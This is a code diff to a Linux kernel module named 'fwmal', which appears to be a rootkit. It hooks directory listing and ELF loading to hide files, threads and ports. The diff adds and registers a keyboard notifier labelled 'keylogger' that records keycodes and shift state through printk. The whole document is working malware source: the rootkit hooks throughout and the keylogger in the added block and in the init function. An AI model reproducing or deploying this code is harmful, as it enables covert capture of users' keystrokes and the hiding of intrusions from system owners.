@@ -15,6 +15,7 @@
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
 #include <linux/ip.h>
+#include <linux/keyboard.h>
 #include <linux/list.h>
 #include <linux/sched.h>   //wake_up_process()
 #include <linux/kthread.h> //kthread_create()、kthread_run()
@@ -107,6 +108,35 @@ int deletefile(struct fwmal_filename* file){
 	kfree(file);
 	return 0;
 }
+
+/*
+Linux内核中
+struct keyboard_notifier_param {
+	struct vc_data *vc;	// VC on which the keyboard press was done
+	int down;		// Pressure of the key?
+	int shift;		// Current shift mask
+	int ledstate;		// Current led state
+	unsigned int value;	// keycode, unicode value or keysym
+};
+*/
+static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param)
+{
+	struct keyboard_notifier_param *param = _param;
+	printk("[fwmal]: enter keylogger");
+	if (code == KBD_KEYCODE)
+	{
+		printk("[fwmal]:%d\n",param->down);
+		printk("[fwmal]:%d\n",param->shift);
+		printk("[fwmal]:%d\n",param->ledstate);
+		printk("[fwmal]:%d\n",param->value);
+	}
+	return NOTIFY_OK;
+}
+
+static struct notifier_block keylogger_nb =
+{
+    .notifier_call = keylogger_notify
+};
 
 KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_fillonedir(void *__buf, const char *name, int namlen,
@@ -322,8 +352,7 @@ static int khook_load_elf_binary(struct linux_binprm *bprm)
 
 /*
 netfilter 钩子函数
-*/
-/*
+
 unsigned int packet_hook(const struct nf_hook_ops *ops,
 				struct sk_buff *socket_buffer,
 				const struct net_device *in,
@@ -374,7 +403,6 @@ void init_nf(void)
 4、hideports：隐藏端口
 5、getnetpacket：获取网络包
 6、getkeyboard：获取键盘输入
-7、getmouse：得到鼠标位置
 */
 int parse(char* buf){
 	/*
@@ -404,7 +432,7 @@ int parse(char* buf){
 		printk("[fwmal]:hidethread");	
 		addpid(simple_strtoull(buf+11,NULL,0));
 	}else if(strcmp(buf,"hideports") ==0){
-		printk("[fwmal]:hidethread");	
+		printk("[fwmal]:hideports");	
 		addpid((unsigned short)simple_strtoull(buf+11,NULL,0));
 	}
 	
@@ -460,7 +488,6 @@ int fwmal_thread(void* data)
 	return 0;
 }
 
-
 void init_thread(void)
 {
 	//初始化socket相关内容
@@ -476,11 +503,12 @@ void init_thread(void)
 	wake_up_process(background_task);
 }
 
-
 static int __init fwmal_init(void)
 {
 	int ret = khook_init();
 	atomic_set(&background_exit,0);
+	if (ret != 0)
+		goto out;
 	//init_thread();
 	//init_nf();
 	//ret = parse("hidefile");
@@ -488,8 +516,8 @@ static int __init fwmal_init(void)
 	//addpid(1);
 	//addport(47006);
 
-	if (ret != 0)
-		goto out;
+	register_keyboard_notifier(&keylogger_nb);
+
 	//printk("[fwmal]:%d\n",ret);
 	printk("[fwmal]:Hello World\n");
 out:
